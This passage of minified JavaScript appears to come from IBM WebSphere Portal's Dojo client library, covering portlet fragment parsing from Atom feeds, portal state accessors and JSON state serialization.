r=!1,n=0;n<com.ibm.portal.aggregation.PORTAL_AGGREGATOR.page._crcPortletChecks.length;n++)com.ibm.portal.aggregation.PORTAL_AGGREGATOR.page._crcPortletChecks[n].id==_52d&&(r=!0,"pending"==com.ibm.portal.aggregation.PORTAL_AGGREGATOR.page._crcPortletChecks[n].state&&(com.ibm.portal.aggregation.PORTAL_AGGREGATOR.page._crcPortletChecks[n].state="error"));r||(com.ibm.portal.aggregation.PORTAL_AGGREGATOR.page._crcPortletChecks.push({id:_52d,state:"pending"}),_535.cancelled=!0,com.ibm.portal.aggregation.PORTAL_AGGREGATOR.page.refreshPageForPortlet(_52d))}if(200==o.status&&com.ibm.portal.aggregation.PORTAL_AGGREGATOR.page._crcPortletChecks.length>0)for(n=0;n<com.ibm.portal.aggregation.PORTAL_AGGREGATOR.page._crcPortletChecks.length;n++)com.ibm.portal.aggregation.PORTAL_AGGREGATOR.page._crcPortletChecks[n].id==_52d&&com.ibm.portal.aggregation.PORTAL_AGGREGATOR.page._crcPortletChecks.splice(n--,1);if(!_535.cancelled){var i=null;"load"==e&&(i=me.createPortletInfo(t)),t instanceof Error&&(i=t),_530||me._fireEvents(i,_52d,o),_52f&&_52f(i,o)}}))}ibm.portal.debug.exit("PortletFragmentService.getPortletInfo")},readWindowID:function(e){ibm.portal.debug.entry("PortletFragmentService.readWindowID",[e]);var t=com.ibm.portal.xpath.evaluateXPath("/atom:feed/atom:entry/atom:id",e,this.namespaces),o=dojox.data.dom.textContent(t[0]);return ibm.portal.debug.exit("PortletFragmentService.readWindowID",[o.substring(4)]),o.substring(4)},readPortletID:function(e){ibm.portal.debug.entry("PortletFragmentService.readPortletID",[e]);var t=com.ibm.portal.xpath.evaluateXPath("/atom:feed/atom:id",e,this.namespaces),o=dojox.data.dom.textContent(t[0]);return ibm.portal.debug.exit("PortletFragmentService.readPortletID",[o.substring(4)]),o.substring(4)},readMarkup:function(e){ibm.portal.debug.entry("PortletFragmentService.readMarkup",[e]);var t=com.ibm.portal.xpath.evaluateXPath("/atom:feed/atom:entry/atom:content",e,this.namespaces),o="";return null!=t&&t.length>0&&(o=dojox.data.dom.textContent(t[0])),ibm.portal.debug.exit("PortletFragmentService.readMarkup",[o]),o},readPortletModes:function(e){ibm.portal.debug.entry("PortletFragmentService.readPortletModes",[e]);var t=com.ibm.portal.xpath.evaluateXPath("/atom:feed/atom:entry/atom:link[@portal:rel='portlet-mode']",e,this.namespaces),o=new Array;if(null!=t&&t.length>0)for(var r=t.length,n=0;n<r;n++)o.push({link:t[n].getAttribute("href"),mode:t[n].getAttribute("title")});return ibm.portal.debug.exit("PortletFragmentService.readPortletModes",[o]),o},readWindowStates:function(e){ibm.portal.debug.entry("PortletFragmentService.readWindowStates",[e]);var t=com.ibm.portal.xpath.evaluateXPath("/atom:feed/atom:entry/atom:link[@portal:rel='window-state']",e,this.namespaces),o=new Array;if(null!=t&&t.length>0)for(var r=t.length,n=0;n<r;n++)o.push({link:t[n].getAttribute("href"),mode:t[n].getAttribute("title")});return ibm.portal.debug.exit("PortletFragmentService.readWindowStates",[o]),o},readDependentPortlets:function(e){ibm.portal.debug.entry("PortletFragmentService.readDependentPortlets",[e]);var t=com.ibm.portal.xpath.evaluateXPath("/atom:feed/atom:link[@portal:rel='dependent']",e,this.namespaces),o=new Array;if(null!=t&&t.length>0)for(var r=t.length,n=0;n<r;n++)o.push({link:t[n].getAttribute("href"),portlet:t[n].getAttribute("title"),uri:t[n].getAttribute("portal:uri")?t[n].getAttribute("portal:uri"):t[n].getAttribute("uri")});return ibm.portal.debug.exit("PortletFragmentService.readDependentPortlets",[o]),o},readOtherPortlets:function(e){ibm.portal.debug.entry("PortletFragmentService.readOtherPortlets",[e]);var t=com.ibm.portal.xpath.evaluateXPath("/atom:feed/atom:link[@portal:rel='other']",e,this.namespaces),o=new Array;if(null!=t&&t.length>0)for(var r=t.length,n=0;n<r;n++)o.push({link:t[n].getAttribute("href"),portlet:t[n].getAttribute("title"),uri:t[n].getAttribute("portal:uri")});return ibm.portal.debug.exit("PortletFragmentService.readOtherPortlets",[o]),o},readStateVaryExpressions:function(e){ibm.portal.debug.entry("PortletFragmentService.readStateVaryExpressions",[e]);var t=com.ibm.portal.xpath.evaluateXPath("/atom:feed/atom:entry/state-vary:state-vary/state-vary:expr",e,this.namespaces),o=new Array;if(null!=t&&t.length>0)for(var r=t.length,n=0;n<r;n++){var i=t[n].firstChild;null!=i&&o.push(i.nodeValue)}return ibm.portal.debug.exit("PortletFragmentService.readStateVaryExpressions",[o]),o},readPortletState:function(e){return this._readPortletState(e)},_readPortletState:function(e){ibm.portal.debug.entry("PortletFragmentService.readPortletState",[e]);var t="/atom:feed/atom:entry/state:root",o=com.ibm.portal.xpath.evaluateXPath(t,e,this.namespaces),r=null;if(null!=o&&o.length>0){var n=com.ibm.portal.xslt.loadXmlString();com.ibm.portal.utilities.addExternalNode(n,o[0]),r=n}else if(t="/atom:feed/state:root",null!=(o=com.ibm.portal.xpath.evaluateXPath(t,e,this.namespaces))&&o.length>0){n=com.ibm.portal.xslt.loadXmlString();com.ibm.portal.utilities.addExternalNode(n,o[0]),r=n}return ibm.portal.debug.exit("PortletFragmentService.readPortletState",[r]),r},readPortletTitle:function(e){return this._readPortletTitle(e)},_readPortletTitle:function(e){ibm.portal.debug.entry("PortletFragmentService.readPortletTitle",[e]);var t=com.ibm.portal.xpath.evaluateXPath("/atom:feed/atom:entry/atom:title",e,this.namespaces),o=dojox.data.dom.textContent(t[0]);return ibm.portal.debug.exit("PortletFragmentService.readPortletTitle",o),o},_fireEvents:function(e,t,o){this._fireGlobalPortletStateChange(e,t,o)},_fireGlobalPortletStateChange:function(e,t,o){com.ibm.portal.EVENT_BROKER.endFragment.fire({portletInfo:e,id:t,xhr:o})},_fireIndividualPortletStateChange:function(e){},createPortletInfo:function(e){var t=this.readWindowID(e),o=this.readPortletID(e),r=this.readMarkup(e),n=this.readPortletModes(e),i=this.readWindowStates(e),a=this.readDependentPortlets(e),s=this.readOtherPortlets(e),l=this.readPortletState(e),d=this.readStateVaryExpressions(e),c=this.readPortletTitle(e),u=l;null==u&&(u=this._readPortletState(e));var h=(new com.ibm.portal.state.StateManager).newPortletAccessor(t,u),p=h.getPortletMode(),m=h.getWindowState();return new com.ibm.portal.services.PortletInfo(t,o,r,n,i,a,s,l,d,p,m,c)}}),dojo.declare("com.ibm.portal.services.IndependentPortletFragmentService",com.ibm.portal.services.PortletFragmentService,{readDependentPortlets:function(e){ibm.portal.debug.entry("DependentPortletFragmentService.readDependentPortlets",[e]);var t=new Array;return ibm.portal.debug.exit("DependentPortletFragmentService.readDependentPortlets",[t]),t},readOtherPortlets:function(e){ibm.portal.debug.entry("DependentPortletFragmentService.readOtherPortlets",[e]);var t=new Array;return ibm.portal.debug.exit("DependentPortletFragmentService.readOtherPortlets",[t]),t},readPortletState:function(e){return null}})),dojo._hasResource["com.ibm.portal.state"]||(dojo._hasResource["com.ibm.portal.state"]=!0,dojo.provide("com.ibm.portal.state"),dojo.declare("com.ibm.portal.state.StateManager",null,{constructor:function(e){this.stateDOM=null,this.stateNode=null,this.ns={state:"http://www.ibm.com/xmlns/prod/websphere/portal/v6.1/portal-state"},this.serializationManager=new com.ibm.portal.state.SerializationManager(e)},getState:function(){return this.stateDOM},newState:function(e,t,o){var r=null;if(null==e)r=com.ibm.portal.xslt.loadXmlString();else if(null==t)r=com.ibm.portal.xslt.loadXmlString(dojox.data.dom.innerXML(e));else{var n=com.ibm.portal.xslt.transform(e,t,null,o,!0);r=com.ibm.portal.xslt.loadXmlString(n)}return r},reset:function(e){this.stateDOM=e,this.stateNode=this._getStateNode(e)},getSerializationManager:function(){return this.serializationManager},newExpansionsListAccessor:function(e){var t,o;return null==e||this.stateDOM==e?(t=this.stateNode,o=this.stateDOM):(t=this._getStateNode(e),o=e),new com.ibm.portal.state.ExpansionsListAccessor(t,o)},newPortletAccessor:function(e,t){var o,r;null==t||this.stateDOM==t?(o=this.stateNode,r=this.stateDOM):(o=this._getStateNode(t),r=t);var n="state:portlet[@id='"+e+"']",i=this._getSpecificStateNode("portlet",n,o,r);return i.setAttribute("id",e),new com.ibm.portal.state.PortletAccessor(i,r)},newPortletListAccessor:function(e){var t,o;return null==e||this.stateDOM==e?(t=this.stateNode,o=this.stateDOM):(t=this._getStateNode(e),o=e),new com.ibm.portal.state.PortletListAccessor(t,o)},newSelectionAccessor:function(e){var t,o;null==e||this.stateDOM==e?(t=this.stateNode,o=this.stateDOM):(t=this._getStateNode(e),o=e);var r=this._getSpecificStateNode("selection","state:selection",t,o);return new com.ibm.portal.state.SelectionAccessor(r,o)},newSoloStateAccessor:function(e){var t,o;null==e||this.stateDOM==e?(t=this.stateNode,o=this.stateDOM):(t=this._getStateNode(e),o=e);var r=this._getSpecificStateNode("solo","state:solo",t,o);return new com.ibm.portal.state.SoloStateAccessor(r,o)},newThemeTemplateAccessor:function(e){var t,o;null==e||this.stateDOM==e?(t=this.stateNode,o=this.stateDOM):(t=this._getStateNode(e),o=e);var r=this._getSpecificStateNode("theme-template","state:theme-template",t,o);return new com.ibm.portal.state.ThemeTemplateAccessor(r,o)},newThemePolicyAccessor:function(e){var t,o;null==e||this.stateDOM==e?(t=this.stateNode,o=this.stateDOM):(t=this._getStateNode(e),o=e);var r=this._getSpecificStateNode("theme-policy","state:theme-policy",t,o);return new com.ibm.portal.state.ThemePolicyAccessor(r,o)},newScreenTemplateAccessor:function(e){var t,o;null==e||this.stateDOM==e?(t=this.stateNode,o=this.stateDOM):(t=this._getStateNode(e),o=e);var r=this._getSpecificStateNode("screen-template","state:screen-template",t,o);return new com.ibm.portal.state.ScreenTemplateAccessor(r,o)},newLocaleAccessor:function(e){var t,o;null==e||this.stateDOM==e?(t=this.stateNode,o=this.stateDOM):(t=this._getStateNode(e),o=e);var r=this._getSpecificStateNode("locale","state:locale",t,o);return new com.ibm.portal.state.LocaleAccessor(r,o)},newStatePartitionAccessor:function(e){var t,o;null==e||this.stateDOM==e?(t=this.stateNode,o=this.stateDOM):(t=this._getStateNode(e),o=e);var r=this._getSpecificStateNode("statepartition","state:statepartition",t,o);return new com.ibm.portal.state.StatePartitionAccessor(r,o)},newSharedStateListAccessor:function(e){var t,o;return null==e||this.stateDOM==e?(t=this.stateNode,o=this.stateDOM):(t=this._getStateNode(e),o=e),new com.ibm.portal.state.SharedStateListAccessor(t,o)},newSharedStateAccessor:function(e,t){var o,r;null==t||this.stateDOM==t?(o=this.stateNode,r=this.stateDOM):(o=this._getStateNode(t),r=t);var n="state:shared-parameters[@id='"+e+"']",i=this._getSpecificStateNode("shared-parameters",n,o,r);return i.setAttribute("id",e),new com.ibm.portal.state.SharedStateAccessor(e,i,r)},_getStateNode:function(e){var t=com.ibm.portal.xpath.evaluateXPath("state:root/state:state",e,this.ns),o=null;if(t&&t.length>0)o=t[0];else{var r=null,n=com.ibm.portal.xpath.evaluateXPath("state:root",e,this.ns);n&&n.length>0?r=n[0]:(r=this._createElement(e,"root"),this._prependChild(r,e)),o=this._createElement(e,"state"),this._prependChild(o,r),o.setAttribute("type","navigational")}return o},_getSpecificStateNode:function(e,t,o,r){var n,i=com.ibm.portal.xpath.evaluateXPath(t,o,this.ns);return null==i||i.length<=0?(n=this._createElement(r,e),this._prependChild(n,o)):n=i[0],n},_prependChild:function(e,t){t.firstChild?t.insertBefore(e,t.firstChild):t.appendChild(e)},_createElement:function(e,t){return dojo.isIE||void 0!==window.ActiveXObject?e.createNode(1,t,this.ns.state):e.createElementNS(this.ns.state,t)}}),dojo.declare("com.ibm.portal.state.PortletAccessor",null,{constructor:function(e,t){this.portletNode=e,this.stateDOM=t,this.parameters=new com.ibm.portal.state.Parameters(e,t),this.ns={state:"http://www.ibm.com/xmlns/prod/websphere/portal/v6.1/portal-state"},this.xsltURL=dojo.moduleUrl("com","ibm/portal/state/")},getPortletMode:function(){var e=com.ibm.portal.xpath.evaluateXPath("state:portlet-mode",this.portletNode,this.ns),t=ibm.portal.portlet.PortletMode.VIEW;if(null!=e&&e.length>0){var o=e[0].firstChild;null!=o&&(t=o.nodeValue)}return t},getWindowState:function(){var e=com.ibm.portal.xpath.evaluateXPath("state:window-state",this.portletNode,this.ns),t=ibm.portal.portlet.WindowState.NORMAL;if(null!=e&&e.length>0){var o=e[0].firstChild;null!=o&&(t=o.nodeValue)}return t},getRenderParameters:function(){return this.parameters},setPortletMode:function(e){var t=com.ibm.portal.xpath.evaluateXPath("state:portlet-mode",this.portletNode,this.ns);if(null==t||t.length<=0){var o=this._createElement(this.stateDOM,"portlet-mode");this._prependChild(o,this.portletNode);var r=this.stateDOM.createTextNode(e);this._prependChild(r,o)}else t[0].firstChild.nodeValue=e},setWindowState:function(e){var t=com.ibm.portal.xpath.evaluateXPath("state:window-state",this.portletNode,this.ns);if(null==t||t.length<=0){var o=this._createElement(this.stateDOM,"window-state");this._prependChild(o,this.portletNode);var r=this.stateDOM.createTextNode(e);this._prependChild(r,o)}else t[0].firstChild.nodeValue=e},getPortletState:function(){var e=com.ibm.portal.xslt.loadXmlString(),t=com.ibm.portal.state.STATE_MANAGER.newPortletAccessor(this.portletNode.getAttribute("id"),e);t.setPortletMode(this.getPortletMode()),t.setWindowState(this.getWindowState());var o=this.getRenderParameters().getMap();return o.length>0&&t.getRenderParameters().putAll(o),e},setPortletState:function(e,t){var o=com.ibm.portal.state.STATE_MANAGER.newPortletAccessor(this.portletNode.getAttribute("id"),e);this.setPortletMode(o.getPortletMode()),this.setWindowState(o.getWindowState());var r=o.getRenderParameters().getMap();null!=t&&0!=t||this.getRenderParameters().clear(),r.length>0&&this.getRenderParameters().putAll(r)},_prependChild:function(e,t){t.firstChild?t.insertBefore(e,t.firstChild):t.appendChild(e)},_createElement:function(e,t){return dojo.isIE||void 0!==window.ActiveXObject?e.createNode(1,t,this.ns.state):e.createElementNS(this.ns.state,t)}}),dojo.declare("com.ibm.portal.state.Parameters",null,{constructor:function(e,t){this.baseNode=e,this.stateDOM=t,this.ns={state:"http://www.ibm.com/xmlns/prod/websphere/portal/v6.1/portal-state"}},getMap:function(){for(var e=this.getNames(),t=new Array(e.length),o=0;o<e.length;o++){var r=e[o];t[o]={name:r,values:this.getValues(r)}}return t},getNames:function(){var e=com.ibm.portal.xpath.evaluateXPath("state:parameters/state:param",this.baseNode,this.ns),t=new Array;if(null!=e&&e.length>0)for(var o=e.length,r=0;r<o;r++)t[r]=e[r].getAttribute("name");return t},getValue:function(e){var t=this.getValues(e),o=null;return null!=t&&t.length>0&&(o=t[0]),o},getValues:function(e){var t="state:parameters/state:param[@name='"+e+"']/state:value",o=com.ibm.portal.xpath.evaluateXPath(t,this.baseNode,this.ns),r=null;return null!=o&&o.length>0&&(r=[],dojo.forEach(o,(function(e){var t=dojox.xml.parser.textContent(e);r.push(t)}))),r},remove:function(e){var t="state:parameters/state:param[@name='"+e+"']",o=com.ibm.portal.xpath.evaluateXPath(t,this.baseNode,this.ns);if(null!=o){var r=o[0];r&&r.parentNode&&r.parentNode.removeChild(r)}},putAll:function(e){if(null!=e&&e.length>0)for(var t=e.length-1;t>=0;t--){var o=e[t].name,r=e[t].values;this.setValues(o,r)}},setValue:function(e,t){this.setValues(e,new Array(t))},setValues:function(e,t){var o,r=this._getParamsRoot(),n="state:param[@name='"+e+"']",i=com.ibm.portal.xpath.evaluateXPath(n,r,this.ns);if(i&&i.length>0?(o=i[0],dojox.data.dom.removeChildren(o)):((o=this._createElement(this.stateDOM,"param")).setAttribute("name",e),this._prependChild(o,r)),t)for(var a=t.length-1;a>=0;a--){var s=this._createElement(this.stateDOM,"value");this._prependChild(s,o);var l=t[a];if(dojo.isString(l)){var d=this.stateDOM.createTextNode(l);this._prependChild(d,s)}}},clear:function(){var e=com.ibm.portal.xpath.evaluateXPath("state:parameters",this.baseNode,this.ns);if(null!=e){var t=e[0];t&&t.parentNode&&t.parentNode.removeChild(t)}},_getParamsRoot:function(){if(!this.params){var e=com.ibm.portal.xpath.evaluateXPath("state:parameters",this.baseNode,this.ns);if(e&&e.length>0)this.params=e[0];else{var t=this._createElement(this.stateDOM,"parameters");this._prependChild(t,this.baseNode),this.params=t}}return this.params},_prependChild:function(e,t){t.firstChild?t.insertBefore(e,t.firstChild):t.appendChild(e)},_createElement:function(e,t){return dojo.isIE||void 0!==window.ActiveXObject?e.createNode(1,t,this.ns.state):e.createElementNS(this.ns.state,t)}}),dojo.declare("com.ibm.portal.state.ExpansionsListAccessor",null,{constructor:function(e,t){this.stateNode=e,this.stateDOM=t,this.ns={state:"http://www.ibm.com/xmlns/prod/websphere/portal/v6.1/portal-state"}},getExpansions:function(){var e=com.ibm.portal.xpath.evaluateXPath("state:expansions/state:node",this.stateNode,this.ns),t=null;if(null!=e&&e.length>0){t=new Array(e.length);for(var o=0;o<e.length;o++){var r=e[o];t[o]=r.getAttribute("id")}}return t},setExpansions:function(e){var t=com.ibm.portal.xpath.evaluateXPath("state:expansions",this.stateNode,this.ns);if(null!=t){var o,r=t[0];for(r||(r=this._createElement(this.stateDOM,"expansions"),this.stateNode.appendChild(r));r.childNodes.length>0;)r.removeChild(r.childNodes[0]);for(var n=0;n<e.length;n++)(o=this._createElement(this.stateDOM,"node")).setAttribute("id",e[n]),r.appendChild(o)}},_createElement:function(e,t){return dojo.isIE||void 0!==window.ActiveXObject?e.createNode(1,t,this.ns.state):e.createElementNS(this.ns.state,t)}}),dojo.declare("com.ibm.portal.state.PortletListAccessor",null,{constructor:function(e,t){this.stateNode=e,this.stateDOM=t,this.ns={state:"http://www.ibm.com/xmlns/prod/websphere/portal/v6.1/portal-state"}},getPortlets:function(){var e=com.ibm.portal.xpath.evaluateXPath("state:portlet",this.stateNode,this.ns),t=null;if(null!=e&&e.length>0){t=new Array(e.length);for(var o=0;o<e.length;o++){var r=e[o];t[o]=r.getAttribute("id")}}return t}}),dojo.declare("com.ibm.portal.state.SharedStateListAccessor",null,{constructor:function(e,t){this.stateNode=e,this.stateDOM=t,this.ns={state:"http://www.ibm.com/xmlns/prod/websphere/portal/v6.1/portal-state"}},getScopeIDs:function(){var e=com.ibm.portal.xpath.evaluateXPath("state:shared-parameters",this.stateNode,this.ns),t=[];return e&&e.length>0&&dojo.forEach(e,(function(e){var o=e.getAttribute("id");o&&t.push(o)})),t}}),dojo.declare("com.ibm.portal.state.SharedStateAccessor",null,{constructor:function(e,t,o){this.scopeID=e,this.sharedStateNode=t,this.stateDOM=o,this.xpath=com.ibm.portal.xpath,this.ns={state:"http://www.ibm.com/xmlns/prod/websphere/portal/v6.1/portal-state"},this.xsltURL=dojo.moduleUrl("com","ibm/portal/state/")},getScopeID:function(){return this.scopeID},getQNames:function(){var e=this.xpath.evaluateXPath("state:shared-parameter",this.sharedStateNode,this.ns),t=[];if(e&&e.length>0){var o=this;dojo.forEach(e,(function(e){var r=e.getAttribute("nsuri"),n=e.getAttribute("localpart");t.push(o._serializeQName(r,n))}))}return t},_serializeQName:function(e,t){return"{"+e+"}"+t},_deserializeQName:function(e){var t=e.split("}"),o={};return t&&2==t.length&&(o.nsuri=t[0].substring(1),o.localpart=t[1]),o},getValues:function(e){var t=this._deserializeQName(e),o=t.nsuri,r=t.localpart;if(dojo.isString(o)&&r){var n="state:shared-parameter[@nsuri='"+o+"'][@localpart='"+r+"']/state:value",i=this.xpath.evaluateXPath(n,this.sharedStateNode,this.ns);if(i&&i.length>0){var a=[];return dojo.forEach(i,(function(e){var t=dojox.xml.parser.textContent(e);t&&a.push(t)})),a}return null}},getValue:function(e){var t=this.getValues(e);return t&&t.length>0?t[0]:null},setValues:function(e,t){var o=this._deserializeQName(e),r=o.nsuri,n=o.localpart,i="state:shared-parameter[@nsuri='"+r+"'][@localpart='"+n+"']",a=this.xpath.evaluateXPath(i,this.sharedStateNode,this.ns),s=null;if(a&&a.length>0?(s=a[0],dojox.xml.parser.removeChildren(s)):((s=this._createElement(this.stateDOM,"shared-parameter")).setAttribute("nsuri",r),s.setAttribute("localpart",n),this._prependChild(s,this.sharedStateNode)),s&&t)for(var l=t.length-1;l>=0;l--){var d=this._createElement(this.stateDOM,"value");this._prependChild(d,s);var c=t[l];if(dojo.isString(c)){var u=this.stateDOM.createTextNode(c);this._prependChild(u,d)}}},setValue:function(e,t){t&&this.setValues(e,[t])},_prependChild:function(e,t){t.firstChild?t.insertBefore(e,t.firstChild):t.appendChild(e)},_createElement:function(e,t){return dojo.isIE||void 0!==window.ActiveXObject?e.createNode(1,t,this.ns.state):e.createElementNS(this.ns.state,t)}}),dojo.declare("com.ibm.portal.state.SelectionAccessor",null,{constructor:function(e,t){this.selectionNode=e,this.stateDOM=t,this.parameters=new com.ibm.portal.state.Parameters(this.selectionNode,t),this.ns={state:"http://www.ibm.com/xmlns/prod/websphere/portal/v6.1/portal-state"}},getPageSelection:function(){return this.selectionNode.getAttribute("selection-node")},getFragmentSelection:function(){var e=this.getParameters().getValues("frg"),t=null;return null!=e&&e.length>0&&(t=e[0],e.length>1&&"pw"==t&&(t=e[1])),t},getMapping:function(e){var t="state:mapping[@src='"+e+"']",o=com.ibm.portal.xpath.evaluateXPath(t,this.selectionNode,this.ns),r=null;null!=o&&o.length>0&&(r=o[0].getAttribute("dst"));return r},getMappingSources:function(){var e=com.ibm.portal.xpath.evaluateXPath("state:mapping",this.selectionNode,this.ns),t=[];return e&&e.length>0&&dojo.forEach(e,(function(e){var o=e.getAttribute("src");o&&t.push(o)})),t},getParameters:function(){return this.parameters},setPageSelection:function(e){this.selectionNode.setAttribute("selection-node",e)},setURI:function(e){this.selectionNode.setAttribute("selection-uri",e)},getURI:function(){return this.selectionNode.getAttribute("selection-uri")},setFragmentSelection:function(e,t){var o=this.getParameters();if(null==t||1==t){var r=new Array(2);r[0]=e,r[1]="pw",o.setValues("frg",r)}else o.setValue("frg",e)},setMapping:function(e,t){if(null!=t){var o,r="state:mapping[@src='"+e+"']",n=com.ibm.portal.xpath.evaluateXPath(r,this.selectionNode,this.ns);null!=n&&n.length>0?o=n[0]:(o=this._createElement(this.stateDOM,"mapping"),this._prependChild(o,this.selectionNode),o.setAttribute("src",e)),o.setAttribute("dst",t)}else this.removeMapping(e)},removeMapping:function(e){var t="state:mapping[@src='"+e+"']",o=com.ibm.portal.xpath.evaluateXPath(t,this.selectionNode,this.ns),r=!1;if(null!=o&&o.length>0){for(var n=0;n<o.length;n++){var i=o[n];i&&i.parentNode&&i.parentNode.removeChild(i)}r=!0}return r},_prependChild:function(e,t){t.firstChild?t.insertBefore(e,t.firstChild):t.appendChild(e)},_createElement:function(e,t){return dojo.isIE||void 0!==window.ActiveXObject?e.createNode(1,t,this.ns.state):e.createElementNS(this.ns.state,t)},getSelection:function(){return this.getPageSelection()},setSelection:function(e){this.setPageSelection(e)}}),dojo.declare("com.ibm.portal.state.SingleTokenAccessor",null,{constructor:function(e,t){this.node=e,this.stateDOM=t},setValue:function(e){dojox.xml.parser.removeChildren(this.node),e&&dojox.xml.parser.textContent(this.node,e)},getValue:function(){return dojox.xml.parser.textContent(this.node)},setAttribute:function(e,t){this.node.setAttribute(e,t)},getAttribute:function(e){return this.node.getAttribute(e)}}),dojo.declare("com.ibm.portal.state.SoloStateAccessor",com.ibm.portal.state.SingleTokenAccessor,{constructor:function(e,t){this.soloNode=e,this.stateDOM=t,this.ns={state:"http://www.ibm.com/xmlns/prod/websphere/portal/v6.1/portal-state"}},setSoloPortlet:function(e){this.setValue(e)},getSoloPortlet:function(){return this.getValue()},setReturnSelection:function(e){this.setAttribute("return-selection",e)},getReturnSelection:function(){return this.getAttribute("return-selection")}}),dojo.declare("com.ibm.portal.state.ThemeTemplateAccessor",com.ibm.portal.state.SingleTokenAccessor,{constructor:function(e,t){this.themeTemplateNode=e,this.stateDOM=t},setThemeTemplate:function(e){this.setValue(e)},getThemeTemplate:function(){return this.getValue()}}),dojo.declare("com.ibm.portal.state.ScreenTemplateAccessor",com.ibm.portal.state.SingleTokenAccessor,{constructor:function(e,t){this.screenTemplateNode=e,this.stateDOM=t},setScreenTemplate:function(e){this.setValue(e)},getScreenTemplate:function(){return this.getValue()}}),dojo.declare("com.ibm.portal.state.LocaleAccessor",com.ibm.portal.state.SingleTokenAccessor,{constructor:function(e,t){this.localeNode=e,this.stateDOM=t},setLocale:function(e){this.setValue(e)},getLocale:function(){return this.getValue()}}),dojo.declare("com.ibm.portal.state.ThemePolicyAccessor",com.ibm.portal.state.SingleTokenAccessor,{constructor:function(e,t){this.localeNode=e,this.stateDOM=t},setThemePolicy:function(e){this.setValue(e)},getThemePolicy:function(){return this.getValue()}}),dojo.declare("com.ibm.portal.state.StatePartitionAccessor",com.ibm.portal.state.SingleTokenAccessor,{constructor:function(e,t){this.statePartitionNode=e,this.stateDOM=t},includeStatePartition:function(){this.setStatePartition(this._generateID())},setStatePartition:function(e){this.setValue(e)},getStatePartition:function(){return this.getValue()},_generateID:function(){return Math.floor(100*Math.random())}}),dojo.declare("com.ibm.portal.state.SerializationManager",null,{STATE_URI_SCHEME:"state",STATE_URI_POST:"state:encode",DOWNLOAD_MODE:"download",STATUS_UNDEFINED:0,STATUS_OK:1,STATUS_ERROR:2,STATE_NS_URI:"http://www.ibm.com/xmlns/prod/websphere/portal/v6.1/portal-state",JSON_SERIALIZATION:{names:{expansions:"exp",portlets:"pp",pMode:"m",pWState:"w",locale:"lcl",screenTemplate:"scrtm",selection:"sel",selPg:"pg",selFrg:"frg",selURI:"uri",selMaps:"mp",sharedState:"ss",statePartition:"sp",solo:"solo",soloPortlet:"soloP",soloReturn:"soloR",themePolicy:"thp",themeTemplate:"thtm",params:"parm",paramValue:"v"},portlet:{defMode:"view",defWState:"normal"}},constructor:function(e){this.serviceURL=e},sendDebugRequest:function(e,t,o){ibm.portal.debug.entry("SerializationManager.sendDebugRequest",[]);var r=o||{};r.portalURI=ibmPortalConfig.portalURI,r.stateServiceURL=this.serviceURL.substring(0,40);var n=com.ibm.portal.navigation.controller.NAVIGATION_CONTROLLER.getState();r.currPage=n.getPageSelection(),t&&(r.cType=t.xhr.getResponseHeader("Content-Type"),r.status=t.xhr.status);var i=ibmPortalConfig.portalURI+"/DEBUG"+this.buildDebugURLContent(r)+"/DEBUG";dojo.xhrGet({url:i,sync:!1,content:{},headers:{"X-IBM-XHR":"true"},handleAs:"xml",handle:function(e,t){ibm.portal.debug.text("DebugRequest:Response: "+e),com.ibm.ajax.auth.authenticationHandler()},transport:"XMLHTTPTransport"}),ibm.portal.debug.exit("SerializationManager.sendDebugRequest",[])},buildDebugURLContent:function(e){ibm.portal.debug.entry("SerializationManager.buildDebugURLContent",[]);var t="";for(var o in e)t+="/"+o+":"+e[o];return ibm.portal.debug.exit("SerializationManager.buildDebugURLContent",t),t},isDebugReqNeeded:function(e,t){return e instanceof Error||!(t.xhr.status>=200&&t.xhr.status<300)||com.ibm.ajax.auth.isAuthenticationRequired(e,t)},jsonCoders:{to:{expansions:function(e,t){var o=t.newExpansionsListAccessor().getExpansions();o&&o.length>0&&(e[this.JSON_SERIALIZATION.names.expansions]=o)},portlets:function(e,t){var o=t.newPortletListAccessor(),r=this.jsonCoders.to.portlet;dojo.forEach(o.getPortlets(),(function(o){r.call(this,o,e,t)}),this)},portlet:function(e,t,o){var r=o.newPortletAccessor(e),n=r.getPortletMode(),i=r.getWindowState(),a=r.getRenderParameters(),s=this.JSON_SERIALIZATION.names,l=this.JSON_SERIALIZATION.portlet,d=null,c=[s.portlets,e].join(".");n&&n!=l.defMode&&(d||(d=dojo.setObject(c,{},t)),d[s.pMode]=n),i&&i!=l.defWState&&(d||(d=dojo.setObject(c,{},t)),d[s.pWState]=i),a.getNames().length>0&&(d||(d=dojo.setObject(c,{},t)),this.jsonCoders.to.params.call(this,d,a))},selection:function(e,t){var o=t.newSelectionAccessor(),r=this.JSON_SERIALIZATION.names,n=e[r.selection]={},i=o.getPageSelection(),a=o.getParameters();i&&(n[r.selPg]=i),(i=o.getFragmentSelection())&&(n[r.selFrg]=i),(i=o.getURI())&&(n[r.selURI]=i);var s=o.getMappingSources();if(s.length>0)for(var l=n[r.selMaps]={},d=0;d<s.length;d++)l[s[d]]=o.getMapping(s[d]);a.getNames().length>0&&this.jsonCoders.to.params.call(this,n,a)},sharedStateList:function(e,t){var o=t.newSharedStateListAccessor(),r=this.jsonCoders.to.sharedState;dojo.forEach(o.getScopeIDs(),(function(o){r.call(this,o,e,t)}),this)},sharedState:function(e,t,o){var r=o.newSharedStateAccessor(e),n=this.JSON_SERIALIZATION.names,i=r.getQNames();if(i.length>0)for(var a=dojo.setObject([n.sharedState,e].join("."),{},t),s=0;s<i.length;s++)a[i[s]]=r.getValues(i[s])},params:function(e,t){var o=t.getNames();if(o.length>0)for(var r=e[this.JSON_SERIALIZATION.names.params]={},n=0;n<o.length;n++)r[o[n]]=t.getValues(o[n])}},from:{expansions:function(e,t){var o=e[this.JSON_SERIALIZATION.names.expansions];o&&o.length>0&&t.newExpansionsListAccessor().setExpansions(o)},portlets:function(e,t){var o=this.jsonCoders.from.portlet;for(var r in e[this.JSON_SERIALIZATION.names.portlets])o.call(this,r,e,t)},portlet:function(e,t,o){var r=this.JSON_SERIALIZATION.names,n=this.JSON_SERIALIZATION.portlet,i=dojo.getObject([r.portlets,e].join("."),!1,t);if(i){var a=o.newPortletAccessor(e),s=i[r.pMode],l=i[r.pWState];if(s&&s!=n.defMode&&a.setPortletMode(s),l&&l!=n.defWState&&a.setWindowState(l),i[r.params]){var d=a.getRenderParameters();this.jsonCoders.from.params.call(this,i,d)}}},selection:function(e,t){var o,r=this.JSON_SERIALIZATION.names,n=e[r.selection];if(n){var i=n[r.selPg];for(var a in 